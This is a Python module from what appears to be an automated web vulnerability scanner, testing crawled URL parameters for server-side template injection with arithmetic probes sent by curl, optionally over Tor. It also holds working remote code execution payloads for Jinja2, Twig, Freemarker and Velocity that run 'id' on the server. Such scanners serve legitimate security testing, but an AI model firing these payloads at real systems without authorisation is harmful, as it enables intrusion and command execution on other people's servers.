#!/usr/bin/env python3
# modules/step18_ssti.py — Server Side Template Injection
import os
from core.utils import count_lines, safe_read

class SSTIStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    # Polyglot SSTI detection payloads with expected responses
    PROBES = [
        ("{{7*7}}",         "49"),
        ("${7*7}",          "49"),
        ("<%= 7*7 %>",      "49"),
        ("#{7*7}",          "49"),
        ("{{7*'7'}}",       "7777777"),
        ("${{7*7}}",        "49"),
        ("{7*7}",           "49"),
        ("[[${7*7}]]",      "49"),
        ("%7B%7B7*7%7D%7D", "49"),    # URL encoded {{7*7}}
    ]

    # Engine-specific confirm payloads
    CONFIRM = {
        "Jinja2"  : ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
        "Twig"    : ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
        "Freemarker": ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
        "Velocity": ("#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex", "uid="),
    }

    def run(self):
        urls    = self.f["urls"]
        out     = self.f["ssti_results"]
        found   = 0

        # Get params from arjun or gf
        params_file = self.f["params"]
        if not os.path.isfile(params_file) or count_lines(params_file)==0:
            self.p.shell(f"cat {urls} 2>/dev/null | gf ssti > {params_file} 2>/dev/null")

        if not os.path.isfile(params_file) or count_lines(params_file)==0:
            # Fall back to URL params from crawled URLs
            self.p.shell(
                f"cat {urls} 2>/dev/null | grep '=' | head -100 > {params_file} 2>/dev/null")

        targets = safe_read(params_file)[:50]
        if not targets:
            self.log.warn("SSTI: no params to test"); return

        import urllib.parse
        for url in targets:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs: continue

            for key in list(qs.keys())[:3]:
                for payload, expected in self.PROBES:
                    test_qs = dict(qs)
                    test_qs[key] = [payload]
                    new_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))

                    result = self.p.shell(
                        f"curl -sk --connect-timeout 5 '{new_url}' 2>/dev/null",
                        use_tor=bool(self.p.tor))

                    if expected in result:
                        line = f"SSTI_DETECTED: {new_url} | payload={payload} | expected={expected}"
                        with open(out,"a") as f: f.write(line+"\n")
                        self.p.add_finding("critical","SSTI",new_url,
                                           f"Payload: {payload} → got {expected}","ssti-engine")
                        found += 1
                        break  # Move to next param

        self.log.success(f"SSTI: {found} findings")
